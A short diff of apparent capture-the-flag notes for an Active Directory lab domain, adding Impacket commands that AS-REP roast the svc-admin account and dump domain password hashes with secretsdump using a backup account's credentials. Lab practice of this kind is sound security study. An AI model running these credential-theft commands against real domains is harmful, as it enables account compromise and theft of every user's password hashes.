@@ -1,2 +1,6 @@
-impacket-GetNPUsers
+#/opt/examples/impacket
+
 impacket-GetNPUsers spookysec.local/svc-admin -no-pass -dc-ip 10.10.121.27 
+--------------------------------------------------------------------------------
+
+impacket-secretsdump spookysec.local/backup:password@10.10.106.230 -just-dc
